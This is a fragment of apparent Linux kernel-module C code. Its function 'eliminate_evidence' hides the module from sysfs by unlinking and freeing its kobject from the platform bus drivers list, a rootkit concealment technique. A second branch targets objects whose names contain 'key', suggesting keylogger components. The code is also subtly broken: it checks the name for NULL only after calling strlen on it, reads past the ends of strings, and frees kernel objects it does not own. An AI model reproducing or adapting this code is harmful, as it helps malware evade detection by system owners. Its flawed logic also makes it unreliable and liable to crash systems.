/* delete sysfs */


static inline void eliminate_evidence(void){
	struct kobject *kobj = NULL;
/*	if( THIS_MODULE.mkobj.drivers_dir != NULL ){
		THIS_MODULE.mkobj.kobj.name = NULL;
		THIS_MODULE.mkobj.kobj.parent = NULL;
		THIS_MODULE.mkobj.kobj.sd = NULL;
		//__list_delete(&THIS_MODULE.mkobj.kobj.entry);
		THIS_MODULE.mkobj.drivers_dir->name = NULL;
		THIS_MODULE.mkobj.drivers_dir->parent = NULL;
		THIS_MODULE.mkobj.drivers_dir->sd = NULL;
		//__list_delete(&THIS_MODULE.mkobj.drivers_dir->entry);
	}*/
	list_for_each_entry(kobj, &platform_bus_type.p->drivers_kset->list, entry){
		if( strlen(kobj->name) > 0 && kobj->name != NULL ){
			_printk("processing %s\n", kobj->name);
			for(int j = 0; j < strlen(kobj->name); j++){
				if( 	kobj->name[j]   == MODULE_NAME[j]   &&
					kobj->name[j+1] == MODULE_NAME[j+1] &&
					kobj->name[j+2] == MODULE_NAME[j+2] &&
					kobj->name[j+3] == MODULE_NAME[j+3] ){
						_printk("found %s\n", kobj->name);
						kobj->name   = NULL;
						kobj->parent = NULL;
						kobj->kset   = NULL;
						kobj->sd     = NULL;
						__list_delete(&kobj->entry);
						kfree(kobj);
						return;
					}
				if(	kobj->name[j]   == 'k'		&&
					kobj->name[j+1] == 'e'		&&
					kobj->name[j+2] == 'y'		){
						_printk("%s\n", kobj->name);
						kfree(kobj);
						return;
					}
			}
		}
	}
}
